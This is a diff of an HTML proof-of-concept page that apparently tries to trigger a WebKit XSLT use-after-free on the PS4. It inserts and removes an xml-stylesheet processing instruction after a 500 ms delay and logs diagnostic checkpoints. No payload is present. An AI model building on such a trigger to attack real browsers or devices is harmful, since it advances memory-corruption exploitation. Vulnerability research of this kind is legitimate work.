@@ -1,200 +1,238 @@
+
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS4 XSLT Static Delayed Chain Test</title>
+
+<title>PS4 WebKit XSLT UAF - Static V2</title>
 
 <style>
 body {
-    background: #111;
-    color: #ddd;
     font-family: Arial, sans-serif;
     margin: 20px;
+    background: #111;
+    color: #ddd;
+}
+
+h2 {
+    font-size: 22px;
 }
 
 #log {
-    background: #000;
-    border: 1px solid #555;
-    padding: 12px;
     white-space: pre-wrap;
     font-family: monospace;
-    min-height: 280px;
+    background: #000;
+    border: 1px solid #777;
+    padding: 12px;
+    min-height: 300px;
 }
 
 iframe {
+    display: block;
     width: 100%;
     height: 150px;
     margin-top: 15px;
-    border: 1px solid #555;
+    border: 1px solid #777;
+}
+
+.ok {
+    margin-top: 15px;
+    padding: 10px;
+    border: 1px solid #777;
 }
 </style>
 </head>
 
 <body>
 
-<h2>XSLT Delayed Import - Static GitHub Pages Variant</h2>
+<h2>PS4 WebKit XSLT Static V2</h2>
 
 <div id="log"></div>
 
-<iframe id="f" src="resources/target.xml"></iframe>
+<div class="ok">
+    Initial XSLT chain:
+    target.xml → root.xsl → child.xsl → grandchild.xsl
+</div>
+
+<iframe
+    id="f"
+    src="resources/target.xml">
+</iframe>
 
 <script>
+
 (function () {
 
-    var output = document.getElementById("log");
+    var logBox = document.getElementById("log");
     var frame = document.getElementById("f");
 
-    function log(message) {
-        output.textContent += message + "\n";
+    var start = Date.now();
+
+    function elapsed() {
+        return (Date.now() - start) + "ms";
     }
 
-    function getXMLDocument() {
-        try {
-            return frame.contentDocument;
-        } catch (e) {
-            log("ERROR accessing contentDocument: " + e);
-            return null;
-        }
+    function log(message) {
+        logBox.textContent +=
+            "[" + elapsed() + "] " + message + "\n";
     }
 
     /*
-     * 500 ms
+     * We deliberately do NOT wait for iframe.onload.
      *
-     * Same basic operation used by the original LayoutTest:
-     * create an embedded xml-stylesheet ProcessingInstruction,
-     * insert it, then immediately remove it.
+     * The original WebKit test also performs the operation
+     * after a fixed 500 ms delay rather than waiting for the
+     * stylesheet chain to finish.
      */
-    function triggerEmbeddedPI() {
 
-        var doc = getXMLDocument();
+    log("Test started.");
 
-        if (!doc) {
-            log("[500ms] contentDocument unavailable");
-            return;
-        }
+    log("Loading target.xml");
+
+    log("Expected stylesheet chain:");
+    log("  target.xml");
+    log("      -> root.xsl");
+    log("          -> child.xsl");
+    log("              -> grandchild.xsl");
+
+    /*
+     * Useful diagnostic only.
+     *
+     * If iframe.onload happens before 500 ms, the chain has
+     * probably already completed before our trigger.
+     */
+
+    frame.onload = function () {
+        log("iframe load event fired.");
+        log("The XML document/navigation completed.");
+    };
+
+    /*
+     * 500 ms trigger.
+     *
+     * This is intentionally kept close to the original
+     * LayoutTest.
+     */
+
+    setTimeout(function () {
+
+        log("500 ms trigger reached.");
 
         try {
-            log("[500ms] Creating embedded xml-stylesheet PI");
+
+            var doc = frame.contentDocument;
+
+            if (!doc) {
+                log("ERROR: contentDocument is null.");
+                return;
+            }
+
+            log("contentDocument obtained.");
+
+            /*
+             * Create exactly the type of ProcessingInstruction
+             * used by the original test.
+             */
 
             var pi = doc.createProcessingInstruction(
                 "xml-stylesheet",
                 'type="text/xsl" href="#x"'
             );
 
+            log("xml-stylesheet ProcessingInstruction created.");
+
+            /*
+             * Insert before the first child.
+             */
+
             doc.insertBefore(pi, doc.firstChild);
 
-            log("[500ms] PI inserted");
+            log("ProcessingInstruction inserted.");
+
+            /*
+             * Immediately remove it.
+             */
 
             pi.parentNode.removeChild(pi);
 
-            log("[500ms] PI removed");
+            log("ProcessingInstruction removed.");
+
+            log("500 ms trigger completed.");
 
         } catch (e) {
-            log("[500ms] Exception: " + e);
+
+            log("Exception during trigger:");
+            log(String(e));
+
         }
-    }
+
+    }, 500);
 
     /*
-     * Finds the current external xml-stylesheet PI.
+     * Diagnostic checkpoints.
+     *
+     * These DO NOT manipulate the stylesheet chain.
      */
-    function findExternalStyleSheetPI(doc) {
 
-        var node = doc.firstChild;
+    setTimeout(function () {
 
-        while (node) {
-
-            if (node.nodeType === 7 &&
-                node.target === "xml-stylesheet") {
-
-                var data = node.data || "";
-
-                if (data.indexOf("href=") !== -1)
-                    return node;
-            }
-
-            node = node.nextSibling;
-        }
-
-        return null;
-    }
-
-    /*
-     * 1000 ms
-     *
-     * Replace the initial stylesheet chain:
-     *
-     * root-initial.xsl
-     *      ?
-     * child-initial.xsl
-     *
-     * with:
-     *
-     * root-with-grandchild.xsl
-     *      ?
-     * child-with-grandchild.xsl
-     *      ?
-     * grandchild.xsl
-     */
-    function installGrandchildChain() {
-
-        var doc = getXMLDocument();
-
-        if (!doc) {
-            log("[1000ms] contentDocument unavailable");
-            return;
-        }
+        log("1000 ms checkpoint.");
 
         try {
 
-            log("[1000ms] Switching to grandchild chain");
+            var doc = frame.contentDocument;
 
-            var oldPI = findExternalStyleSheetPI(doc);
-
-            if (oldPI) {
-                oldPI.parentNode.removeChild(oldPI);
-                log("[1000ms] Initial stylesheet PI removed");
+            if (doc) {
+                log("XML document is still accessible.");
             } else {
-                log("[1000ms] Initial stylesheet PI not found");
+                log("XML document is unavailable.");
             }
 
-            var newPI = doc.createProcessingInstruction(
-                "xml-stylesheet",
-                'type="text/xsl" href="root-with-grandchild.xsl"'
-            );
-
-            doc.insertBefore(newPI, doc.firstChild);
-
-            log("[1000ms] New stylesheet PI inserted");
-            log("[1000ms] New chain:");
-            log("          root-with-grandchild.xsl");
-            log("              -> child-with-grandchild.xsl");
-            log("                  -> grandchild.xsl");
-
         } catch (e) {
-            log("[1000ms] Exception: " + e);
+
+            log("1000 ms exception:");
+            log(String(e));
+
         }
-    }
 
-    log("[0ms] Test started");
-    log("[0ms] Loading initial XSL chain:");
-    log("      target.xml");
-    log("          -> root-initial.xsl");
-    log("              -> child-initial.xsl");
-
-    setTimeout(function () {
-        triggerEmbeddedPI();
-    }, 500);
-
-    setTimeout(function () {
-        installGrandchildChain();
     }, 1000);
 
     setTimeout(function () {
-        log("[3500ms] Test completed");
-        log("[3500ms] Browser still running");
+
+        log("2000 ms checkpoint.");
+
+        try {
+
+            var doc = frame.contentDocument;
+
+            if (doc)
+                log("contentDocument still accessible.");
+            else
+                log("contentDocument unavailable.");
+
+        } catch (e) {
+
+            log("2000 ms exception:");
+            log(String(e));
+
+        }
+
+    }, 2000);
+
+    /*
+     * Same approximate total observation window as the
+     * original test.
+     */
+
+    setTimeout(function () {
+
+        log("3500 ms test completed.");
+        log("Browser is still executing JavaScript.");
+
     }, 3500);
 
 })();
+
 </script>
 
 </body>
